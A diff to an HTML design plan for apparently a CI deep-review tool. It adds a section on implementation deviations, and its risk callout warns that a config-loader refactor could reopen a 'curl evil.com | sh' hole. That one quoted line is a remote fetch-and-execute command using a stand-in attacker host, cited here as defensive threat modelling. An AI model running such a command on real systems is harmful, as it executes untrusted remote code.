@@ -392,6 +392,13 @@ Plan 09 broker: credentialed push + PR-open   →   remote CI, watched by
   <li>This is <b>Plan 10 of 10, Phase 7</b> — deliberately last: it consumes the escalation chain, the worktree layer, and the delivery broker, and replaces the largest external dependency in the tree.</li>
 </ul>
 
+<h2 id="deviations">Implementation deviations</h2>
+<ul>
+<li><code>bin/mx-lint.sh</code> had already been removed by Plan 1, so the checked-in configuration leaves <code>commands.lint</code> empty and the document/lint agent performs the repository-aligned lint fallback described by this plan.</li>
+<li><code>bin/mx-gate-refuse-lib.sh</code> remains as the single shared owner of the lifecycle marker refusal. Its retired external-checkout detection was removed, while keeping one helper avoids duplicating the same refusal contract across spawn and teardown.</li>
+<li>Agent calls that return only a work summary use a small summary schema in addition to the review and test decision schemas. Only the normalized review and test payloads participate in deterministic gate decisions.</li>
+</ul>
+
 <h2 id="risks">Risks &amp; open questions</h2>
 <div class="callout danger"><div class="label">Risk — trust boundary regression</div>
 <p>The default-branch-only config rule is the plan's load-bearing security property. Any refactor of <code>dr_load_config</code> that "simplifies" to reading the working-tree file silently reopens the <code>curl evil.com | sh</code> hole. Mitigation: the security test in <code>tests/mx-deep-review.test.sh</code> is a permanent regression test, and the loader's header documents the rule with the upstream rationale quote ("the pushed branch controls nothing that executes").</p></div>
